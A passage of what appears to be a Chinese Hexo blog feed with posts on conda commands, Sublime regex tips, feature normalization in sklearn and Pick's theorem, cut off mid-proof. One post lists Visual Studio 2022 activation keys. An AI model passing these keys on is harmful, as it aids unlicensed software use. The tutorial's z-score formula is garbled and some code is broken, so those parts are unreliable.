        <content type="html"><![CDATA[<h3 id="conda常用的命令">conda常用的命令</h3><p>1）查看安装了哪些包</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">conda list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2" type="1"><li>查看当前存在哪些虚拟环境</li></ol><pre class="line-numbers language-text" data-language="text"><code class="language-text">conda env list conda info -e<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>3)检查更新当前conda</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">conda update conda<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="python创建虚拟环境">Python创建虚拟环境</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">conda create -n your_env_name python=x.x<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>anaconda命令创建python版本为x.x，名字为your_env_name的虚拟环境。<strong>your_env_name文件可以在Anaconda安装目录envs文件下找到</strong>。</p><h3 id="激活或者切换虚拟环境">激活或者切换虚拟环境</h3><p>打开命令行，输入python --version检查当前 python 版本。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Linux:  source activate your_env_namWindows: activate your_env_name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>5.对虚拟环境中安装额外的包</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">conda install -n your_env_name [package]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>6.关闭虚拟环境(即从当前环境退出返回使用PATH环境中的默认python版本)</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">deactivate env_nam<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者 <code>activate root</code> 切回root环境 </p><pre class="line-numbers language-none"><code class="language-none">Linux下：source deactivate <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p></p><p>7.删除虚拟环境</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">conda remove -n your_env_name --all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>8.删除环境钟的某个包</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">conda remove --name $your_env_name  $package_name <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>8、设置国内镜像</p><p><a href="https://link.zhihu.com/?target=http%3A//Anaconda.org">http://Anaconda.org</a>的服务器在国外，安装多个packages时，conda下载的速度经常很慢。清华TUNA镜像源有Anaconda仓库的镜像，将其加入conda的配置即可：</p><p># 添加Anaconda的TUNA镜像</p><p>conda config --add channels <a href="https://link.zhihu.com/?target=https%3A//mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/">https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/</a></p><p># TUNA的help中镜像地址加有引号，需要去掉</p><p># 设置搜索时显示通道地址</p><p>conda config --set show_channel_urls yes</p><p>9、恢复默认镜像</p><p>conda config --remove-key channels</p><p>默认情况下，conda 创建的新环境以及过往安装的模块缓存都存储在用户目录下，这一点不会在 conda（user-specific）配置文件 $HOME/.condarc中体现出来，除非用户修改了默认设置。当前的默认信息可通过<code>conda info</code>指令打印查看，其中不仅能够查看当前默认环境路径和默认缓存路径，还能查看conda的源设置。</p><pre class="line-numbers language-none"><code class="language-none">pwsh&gt; conda info     active environment : None       user config file : C:\Users\cya-p\.condarc populated config files : C:\Users\cya-p\.condarc          conda version : 4.11.0    conda-build version : not installed         python version : 3.9.5.final.0       virtual packages : __cuda=11.5=0                          __win=0=0                          __archspec=1=x86_64       base environment : D:\ProgramData\Miniconda3  (writable)      conda av data dir : D:\ProgramData\Miniconda3\etc\conda  conda av metadata url : None           channel URLs : https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/win-64                          https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/noarch                          https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/r/win-64                          https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/r/noarch                          https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/msys2/win-64                          https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/msys2/noarch          package cache : D:\ProgramData\Miniconda3\pkgs                          C:\Users\cya-p\.conda\pkgs                          C:\Users\cya-p\AppData\Local\conda\conda\pkgs       envs directories : D:\ProgramData\Miniconda3\envs                          C:\Users\cya-p\.conda\envs                          C:\Users\cya-p\AppData\Local\conda\conda\envs               platform : win-64             user-agent : conda/4.11.0 requests/2.25.1 CPython/3.9.5 Windows/10 Windows/10.0.22000          administrator : False             netrc file : None           offline mode : False<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>conda环境和缓存的默认路径（envs directories 和 packagecache）不一定要默认存储在用户目录，我们可以将他们设置到盈余空间稍大的其他目录来缓解这种空间压力，只要保证不同用户之间的设置不同即可。</p><p>路径的设置可以通过编辑 $HOME/.condarc 来实现。添加或修改$HOME/.condarc 中的 env_dirs 和 pkgs_dirs配置项分别设置环境和缓存路径，按顺序第一个路径作为默认存储路径，搜索环境和缓存时按先后顺序在各目录中查找。</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> Conda </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022·新年随笔</title>
      <link href="/2022/01/01/2022-xin-nian-sui-bi/"/>
      <url>/2022/01/01/2022-xin-nian-sui-bi/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码认证失败，请检查权限" data-whm="密码验证失败，请检查散列">  <script id="hbeData" type="hbeData" data-hmacdigest="20fdbe8f0ab97440674d8361eb2ae91d7bbfac3f9bb9e74b1edb9d932e37b841">9c1a390cc260e99a826697ddea2c6aea43b6e674c5d816b7ec7c40648141bad93b27cc29a9f6ee482eaea51517e9fcedc253c42275fa0441622e3bd6726dfed593f12f705fbeae112106cbb34ff9e260f69667ab020b0d8bbcfcf9e227f1ea9fe25f77b1d5b1ed0e400a362bcc847987f43ac041e1d6d141c7cd19076bda82f8aac9709d9ba557bf09756ecd0a273fa98b44e78299be7c214dc6b06080e66d82854f1221318829db7ba969255b499fa9bc5d0be10e0ff839b1319701183cd9011c55eee1bd8f8fd4ae3103ef227c0db352aae0b7c028fdf95e11d21224edf6a6660e239140bd544749d6a6a52edd7f80a6b77aa23108e39f3837b1ac6b2d5274230089bf3a42b7b67e14d88b959dac191f4ec382dec814b9add302c5eebe66d38cb6dba575dd1dcd9a1347d92b1cbd1ddb283542edbe9aa92920407b4a6c463c48077282a079ccd0203440cd5f66723aac5c43f6e6c6033cf13c58900064325ad3383bd5f39aeae55b3410259137a3ee935570f4692f860f11fd427f1273a6c96fe39fde8ca00fc5fd908bf5c0f8dd85a513cb70a763b14c1ede6f4e966637186081b22d9e41323676ebeb35d5adadf2d1f8b530fcfc5f2224c49c3b45d9643508dc1e83744fc326aa57b5f45fa483bf3ba73ad5911bca1c80e5cf926209e94daf02611284713705357db722d131eb6b6e34802c2c132c56083cd92ff72321ebd139d94ece27a112cdf626cdda3f551ae6663e643d8ce195feee07faf0d7cc0735a69dd3f40ec5791b58d1aaf21a68b055cf6933e8ee21778e644be6691345ce2b58e746a8988fe4b364acc258756816c29924ce8f417553e5a8dae26e205e968c7c2e717aa8cab1a047366f0e4605cc68fe2e7599fe1fe2e78313b450702624</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-flip">      <input class="hbe hbe-input-field hbe-input-field-flip" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-flip" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-flip" data-content="Hey, password is required here.">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 生活 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Visual Studio 2022 激活码</title>
      <link href="/2021/12/31/visual-studio-2022-ji-huo-ma/"/>
      <url>/2021/12/31/visual-studio-2022-ji-huo-ma/</url>
      
        <content type="html"><![CDATA[<p><a href="https://my.visualstudio.com/downloads">下载链接</a></p><p>Visual Studio 2022 激活码：</p><ul><li><strong>Pro:</strong><code>TD244-P4NB7-YQ6XK-Y8MMM-YWV2J</code></li><li><strong>Enterprise:</strong><code>VHF9H-NXBBB-638P6-6JHCY-88JWH</code></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sublime 删除空行</title>
      <link href="/2021/12/31/sublime-shan-chu-kong-xing/"/>
      <url>/2021/12/31/sublime-shan-chu-kong-xing/</url>
      
        <content type="html"><![CDATA[<h1 id="sublime-删除空行">Sublime 删除空行</h1><h2 id="正则表达式替换法">正则表达式替换法</h2><p><a href="http://platinhom.github.io/2015/06/10/regexp-re/">正则表达式</a></p><h3 id="删除空行">删除空行</h3><p><code>Ctrl+H</code> 进入替换模式, 然后 <code>Alt+R</code> 或者点击<code>/Re</code> 正则表达式, 高亮后表示使用正则模式.</p><p>第一行查找部分输入 <code>^\n</code> 替换部分为空，再<code>Replace all.</code></p><h3 id="删除多余空格">删除多余空格</h3><p>同上，进入正则表达式替换。输入查找 <code>(?ms)\ {2,}</code>，替换成空格。前者表示2个或以上空格的选取。</p><h2 id="deleteblanklines-插件">DeleteBlankLines 插件</h2><p><a href="https://packagecontrol.io/packages/DeleteBlankLines">PackageControl</a></p><p>用法：</p><p>Windnows: <code>Ctrl+Alt+BackSpace</code></p><p>Mac: <code>Ctrl+Alt+Delete</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> Sublime </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>归一化与标准化</title>
      <link href="/2021/12/30/gui-yi-hua-yu-biao-zhun-hua/"/>
      <url>/2021/12/30/gui-yi-hua-yu-biao-zhun-hua/</url>
      
        <content type="html"><![CDATA[<h2 id="一-特征缩放定义">(一) 特征缩放定义</h2><p>特征缩放是用来统一资料中的自变项或特征范围的方法，在资料处理中，通常会被使用在资料前处理这个步骤。因为在原始的资料中，各变数的范围大不相同。</p><h2 id="二-特征缩放的目的">(二) 特征缩放的目的</h2><p>对于大多数的机器学习算法和优化算法来说，将特征值缩放到相同区间可以使得获取性能更好的模型。</p><p>例如：</p><p>（a）有两个不同的特征，第一个特征的取值范围为1~10，第二个特征的取值范围为1~10000。在<strong>梯度下降算法</strong>中，<strong>代价函数</strong>为<strong>最小平方误差函数</strong>，所以在使用梯度下降算法的时候，算法会明显的偏向于第二个特征，因为它的取值范围更大。</p><p>（b）k近邻算法，它使用的是欧式距离，也会导致其偏向于第二个特征。对于<strong>决策树</strong>和<strong>随机森林</strong>以及<strong>XGboost算法</strong>而言，特征缩放对于它们没有什么影响。</p><h2 id="三-常用特征缩放方法">(三) 常用特征缩放方法</h2><p>常用的特征缩放算法有两种，<strong>归一化(normalization)</strong>和<strong>标准化(standardization)</strong></p><h3 id="归一化">1. 归一化</h3><p>（a）归一化是利用特征的最大值，最小值，将特征的值缩放到 <span class="math inline">\([0,1]\)</span> 区间，对于每一列的特征使用 <span class="math inline">\(min - max\)</span> 函数进行缩放。</p><p>（b）归一化可以消除纲量，加快收敛。不同特征往往具有不同的量纲单位，这样的情况会影响到数据分析的结果，为了消除指标之间的量纲影响，需要进行数据归一化处理，以解决数据指标之间的可比性。原始数据经过数据归一化处理后，各指标处于[0,1]之间的小数，适合进行综合对比评价。</p><p>（c） 归一化可能模型提高精度。</p><h4 id="minmax标准化minmax-normalization">（1）min－max标准化（Min－maxnormalization）</h4><h5 id="说明">1）说明</h5><p>标准化为 <span class="math inline">\([0,1]\)</span> <span class="math display">\[x'=\frac{x-X_{\min}}{X_{\max}-X_{\min}}\]</span> 标准化为 <span class="math inline">\([min,max]\)</span> <span class="math display">\[x'=\frac{x'}{X_{\max}-X_{\min}}+X_{\min}\]</span> 其中<span class="math inline">\(X_{max}\)</span>为样本数据的最大值，<span class="math inline">\(X_{min}\)</span>为样本数据的最小值</p><h5 id="缺点">2）缺点</h5><p>这种方法有一个缺陷就是当有新数据加入时，可能导致<span class="math inline">\(max\)</span>和<span class="math inline">\(min\)</span>的变化，需要重新定义。</p><h5 id="python实现">3）python实现</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> sklearn <span class="token keyword">import</span> preprocessing<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token comment">#创建一组特征数据，每一行标识一个样本，每一列标识一个特征</span>X_train <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token number">1.</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.</span><span class="token punctuation">,</span>  <span class="token number">2.</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                    <span class="token punctuation">[</span> <span class="token number">2.</span><span class="token punctuation">,</span>  <span class="token number">0.</span><span class="token punctuation">,</span>  <span class="token number">0.</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                    <span class="token punctuation">[</span> <span class="token number">0.</span><span class="token punctuation">,</span>  <span class="token number">1.</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>min_max_scaler <span class="token operator">=</span> preprocessing<span class="token punctuation">.</span>MinMaxScaler<span class="token punctuation">(</span><span class="token punctuation">)</span>X_train_minmax <span class="token operator">=</span> min_max_scaler<span class="token punctuation">.</span>fit_transform<span class="token punctuation">(</span>X_train<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>X_train_minmax<span class="token punctuation">)</span><span class="token comment">#将相同的缩放应用到测试集数据中</span>X_test <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token operator">-</span><span class="token number">3.</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.</span><span class="token punctuation">,</span>  <span class="token number">4.</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>X_test_minmax <span class="token operator">=</span> min_max_scaler<span class="token punctuation">.</span>transform<span class="token punctuation">(</span>X_test<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>X_test_minmax<span class="token punctuation">)</span><span class="token comment">#打印缩放因子等属性</span><span class="token keyword">print</span><span class="token punctuation">(</span>min_max_scaler<span class="token punctuation">.</span>scale_<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>min_max_scaler<span class="token punctuation">.</span>min_<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="log函数转换">（2）log函数转换</h4><h5 id="说明-1">1）说明</h5><p><span class="math display">\[x'=\frac{\log _{10}\left( x \right)}{\log _{10}\left( \max \right)}\]</span></p><p>max为样本数据最大值，并且所有的数据都要大于等于1</p><h4 id="atan函数转换">（3）atan函数转换</h4><h5 id="说明-2">1）说明</h5><p><span class="math display">\[x'=\frac{2\text{atan}\left( x \right)}{\pi}\]</span></p><p>使用这个方法需要注意的是如果想映射的区间为[0,1]，则数据都应该大于等于0，小于0的数据将被映射到[-1,0]区间上，而并非所有数据标准化的结果都映射到[0,1]区间上。</p><h4 id="l2-norm归一化">（4）l2-norm归一化</h4><h5 id="说明-3">1）说明</h5><p><span class="math display">\[x'=\frac{x}{\sqrt{\sum\limits_{i=1}^n{x_{i}^{2}}}}\]</span></p><p>正则化是将样本在向量空间模型上的一个转换，经常被使用在分类与聚类中。</p><h5 id="特性">2）特性</h5><ol type="a"><li><p>normalize和Normalizer都既可以用在密集数组也可以用在稀疏矩阵（scipy.sparse)中</p></li><li><p>对于稀疏的输入数据，它会被转变成维亚索的稀疏行表征（具体请见scipy.sparse.csr_matrix)</p></li></ol><h5 id="python实现-1">3）python实现</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> sklearn <span class="token keyword">import</span> preprocessing<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token comment">#创建一组特征数据，每一行标识一个样本，每一列标识一个特征</span>X_train <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token number">1.</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.</span><span class="token punctuation">,</span>  <span class="token number">2.</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                    <span class="token punctuation">[</span> <span class="token number">2.</span><span class="token punctuation">,</span>  <span class="token number">0.</span><span class="token punctuation">,</span>  <span class="token number">0.</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                    <span class="token punctuation">[</span> <span class="token number">0.</span><span class="token punctuation">,</span>  <span class="token number">1.</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>x_normalized <span class="token operator">=</span> preprocessing<span class="token punctuation">.</span>normalize<span class="token punctuation">(</span>x<span class="token punctuation">,</span> norm<span class="token operator">=</span><span class="token string">'l2'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x_normalized<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>preprocessing这个模块还提供了一个实用类Normalizer,实用transform方法同样也可以对新的数据进行同样的转换</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 根据训练数据创建一个正则器</span>normalizer <span class="token operator">=</span> preprocessing<span class="token punctuation">.</span>Normalizer<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>fit<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>normalizer<span class="token punctuation">)</span><span class="token comment"># 对训练数据进行正则</span>normalizer<span class="token punctuation">.</span>transform<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token comment"># 对新的测试数据进行正则</span>normalizer<span class="token punctuation">.</span>transform<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1.</span><span class="token punctuation">,</span> <span class="token number">1.</span><span class="token punctuation">,</span> <span class="token number">0.</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="标准化">2. 标准化</h3><p>（a）标准化是通过特征的平均值和标准差，将特征缩放成一个标准的正态分布，缩放后均值为0，方差为1。但即使数据不服从正态分布，也可以用此法。特别适用于数据的最大值和最小值未知，或存在孤立点。</p><p>（b）标准化是为了方便数据的下一步处理，而进行的数据缩放等变换，不同于归一化，并不是为了方便与其他数据一同处理或比较。</p><h4 id="z-score">（1） z-score</h4><h5 id="公式">1）公式</h5><p><span class="math inline">\(x′=(x−μ)σx′=(x−μ)σ\)</span></p><p>其中μ为特征的期望（平均值），σ为标准差</p><h5 id="优缺点">2）优缺点</h5><p>（a）Z-Score最大的优点就是简单，容易计算，Z-Score能够应用于数值型的数据，并且不受数据量级的影响，因为它本身的作用就是消除量级给分析带来的不便。</p><p>（b）但是Z-Score应用也有风险。首先，估算Z-Score需要总体的平均值与方差，但是这一值在真实的分析与挖掘中很难得到，大多数情况下是用样本的均值与标准差替代。其次，Z-Score对于数据的分布有一定的要求，正态分布是最有利于Z-Score计算的。最后，Z-Score消除了数据具有的实际意义，A的Z-Score与B的Z-Score与他们各自的分数不再有关系，因此Z-Score的结果只能用于比较数据间的结果，数据的真实意义还需要还原原值。</p><h5 id="python实现-2">3）python实现</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#标准化（Z-Score），或者去除均值和方差缩放</span><span class="token comment">#使用sklearn.preprocessing.scale()函数，可以直接将给定数据进行标准化</span><span class="token keyword">from</span> sklearn <span class="token keyword">import</span> preprocessing<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token comment">#创建一组特征数据，每一行标识一个样本，每一列标识一个特征</span>x <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1.</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.</span><span class="token punctuation">,</span> <span class="token number">2.</span><span class="token punctuation">]</span><span class="token punctuation">,</span>              <span class="token punctuation">[</span><span class="token number">2.</span><span class="token punctuation">,</span> <span class="token number">0.</span><span class="token punctuation">,</span> <span class="token number">0.</span><span class="token punctuation">]</span><span class="token punctuation">,</span>              <span class="token punctuation">[</span><span class="token number">0.</span><span class="token punctuation">,</span> <span class="token number">1.</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.</span><span class="token punctuation">]</span>             <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#将每一列特征标准化为标准正态分布，注意，标准化是针对每一列而言的</span>x_scale <span class="token operator">=</span> preprocessing<span class="token punctuation">.</span>scale<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x_scale<span class="token punctuation">)</span><span class="token comment"># 可以查看标准化后的数据的均值与方差，已经变成0,1了</span><span class="token keyword">print</span><span class="token punctuation">(</span>x_scale<span class="token punctuation">.</span>mean<span class="token punctuation">(</span>axis<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># axis=1表示对每一行去做这个操作，axis=0表示对每一列做相同的这个操作</span><span class="token keyword">print</span><span class="token punctuation">(</span>x_scale<span class="token punctuation">.</span>mean<span class="token punctuation">(</span>axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 同理，看一下标准差</span><span class="token keyword">print</span><span class="token punctuation">(</span>x_scale<span class="token punctuation">.</span>std<span class="token punctuation">(</span>axis<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol type="a"><li><p>preprocessing这个模块还提供了一个实用类StandarScaler，使用sklearn.preprocessing.StandardScaler类，使用该类的好处在于可以保存训练集中的参数（均值、方差）直接使用其对象转换测试集数据集。</p></li><li><p>这是相当好的一个功能。可以对训练数据，测试数据应用相同的转换，以后有新的数据进来也可以直接调用，不用再重新把数据放在一起再计算一次了。</p></li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 调用fit方法，根据已有的训练数据创建一个标准化的转换器</span>scaler <span class="token operator">=</span> preprocessing<span class="token punctuation">.</span>StandardScaler<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>fit<span class="token punctuation">(</span>X<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>scaler<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>scaler<span class="token punctuation">.</span>mean_<span class="token punctuation">)</span><span class="token comment"># 使用上面这个转换器去转换训练数据x,调用transform方法</span><span class="token keyword">print</span><span class="token punctuation">(</span>scaler<span class="token punctuation">.</span>transform<span class="token punctuation">(</span>X<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#可以直接使用训练集对测试集数据进行转换</span><span class="token keyword">print</span><span class="token punctuation">(</span>scaler<span class="token punctuation">.</span>transform<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1.</span><span class="token punctuation">,</span> <span class="token number">1.</span><span class="token punctuation">,</span> <span class="token number">0.</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="归一化与标准化区别">3. 归一化与标准化区别</h3><ol type="a"><li><p>目的不同，归一化是为了消除纲量压缩到[0,1]区间；标准化只是调整特征整体的分布。</p></li><li><p>归一化与最大，最小值有关；标准化与均值，标准差有关。</p></li><li><p>归一化输出在[0,1]之间；标准化无限制。</p></li></ol><h3 id="归一化与标准化应用场景">4. 归一化与标准化应用场景</h3><ol type="a"><li><p>在分类、聚类算法中，需要使用距离来度量相似性的时候（如SVM、KNN）、或者使用PCA技术进行降维的时候，标准化(Z-scorestandardization)表现更好。</p></li><li><p>在不涉及距离度量、协方差计算、数据不符合正太分布的时候，可以使用第一种方法或其他归一化方法。比如图像处理中，将RGB图像转换为灰度图像后将其值限定在[0255]的范围。</p></li><li><p>基于树的方法不需要进行特征的归一化。例如随机森林，bagging与boosting等方法。如果是基于参数的模型或者基于距离的模型，因为需要对参数或者距离进行计算，都需要进行归一化。</p></li></ol><hr><blockquote><p>References:</p><p><a href="https://blog.csdn.net/sinat_29957455/article/details/79490165">使用scikit-learn对特征进行归一化和标准化</a></p><p><a href="https://blog.csdn.net/u012101561/article/details/72506273/">归一化与标准化</a></p><p><a href="https://blog.csdn.net/u011650143/article/details/71515927">模式识别之样本数据归一化（Normalization）与标准化（Standardization）</a></p><p><a href="https://www.jianshu.com/p/3761bad01053">数据归一化与标准化</a></p><p><a href="https://blog.csdn.net/power0405hf/article/details/53456162">标准化,归一化和正则化</a></p><p><a href="https://www.jianshu.com/p/95a8f035c86c">归一化（Normalization）、标准化 （Standardization）和中心化/零均值化（Zero-centered）</a></p><p><a href="https://www.cnblogs.com/pejsidney/p/8031250.html">数据标准化/归一化normalization</a></p><p><a href="https://blog.csdn.net/sinat_33761963/article/details/53433799">预处理数据的方法总结（使用sklearn-preprocessing）</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 数学 </tag>
            
            <tag> 机器学习 </tag>
            
            <tag> 数据清洗 </tag>
            
            <tag> 数据处理 </tag>
            
            <tag> 大数据 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>皮克定理简介</title>
      <link href="/2021/12/24/pi-ke-ding-li-jian-jie/"/>
      <url>/2021/12/24/pi-ke-ding-li-jian-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="皮克定理">皮克定理</h1><h2 id="简介">简介</h2><h3 id="定理内容">定理内容</h3><p>给定顶点座标均是整点（或正方形格子点）的简单多边形，皮克定理说明了其面积<span class="math inline">\(A\)</span> 和内部格点数目 <span class="math inline">\(i\)</span> 、边上格点数目 <span class="math inline">\(b\)</span> 的关系：</p><p><span class="math display">\[A=i+{\frac {b}{2}}-1\]</span></p><h4 id="例子">例子</h4><p><img src="https://googles.plus/images/loading.gif" data-original="\images\Pick_theorem.png"> <span class="math display">\[b=14,i=39,A=45\]</span></p><h3 id="证明">证明</h3><p>因为所有简单多边形都可切割为一个<strong>三角形</strong>和另一个<strong>简单多边形</strong>。考虑一个<strong>简单多边形</strong><span class="math inline">\(P\)</span> ，及跟 <span class="math inline">\(P\)</span> 有一条共同边的三角形 <span class="math inline">\(T\)</span> 。若 <span class="math inline">\(P\)</span> 符合皮克公式，则只要证明 <span class="math inline">\(P\)</span> 加上 <span class="math inline">\(T\)</span> 的 <span class="math inline">\(PT\)</span>亦符合皮克公式（I），与及三角形符合皮克公式（II），就可根据<strong>数学归纳法</strong>，对于所有<strong>简单多边形</strong>皮克公式都是成立的。</p><h4 id="多边形">多边形</h4><p>设 <span class="math inline">\(P\)</span> 和 <span class="math inline">\(T\)</span> 的共同边上有 <span class="math inline">\(c\)</span> 个格点。</p><ul><li><span class="math inline">\(P\)</span> 的面积： <span class="math inline">\(i_{P}+{\frac {b_{P}}{2}}-1\)</span></li><li><span class="math inline">\(T\)</span> 的面积： <span class="math inline">\(i_{T}+{\frac {b_{T}}{2}}-1\)</span></li><li><span class="math inline">\(PT\)</span> 的面积：<span class="math inline">\((i_{T}+i_{P}+c-2)+{\frac{b_{T}-c+b_{P}-c+2}{2}}-1\)</span> <span class="math inline">\(=i_{PT}+{\frac {b_{PT}}{2}}-1\)</span></li></ul><h4 id="三角形">三角形</h4><p>证明分三部分：证明以下的图形符合皮克定理：</p><ul><li>所有平行于轴线的矩形；</li><li>以上述矩形的两条邻边和对角线组成的直角三角形；</li><li>所有三角形（因为它们都可内接于矩形内，将矩形分割成原三角形和至多3个第二点提到的直角三角形）。</li></ul><h5 id="矩形">矩形</h5><p>设矩形 <span class="math inline">\(R\)</span> 长边短边各有 <span class="math inline">\(m\)</span> , <span class="math inline">\(n\)</span> 个格点：</p><ul><li><span class="math inline">\(A_{R}=(m-1)(n-1)\)</span></li><li><span class="math inline">\(i_{R}=(m-2)(n-2)\)</span></li><li><span class="math 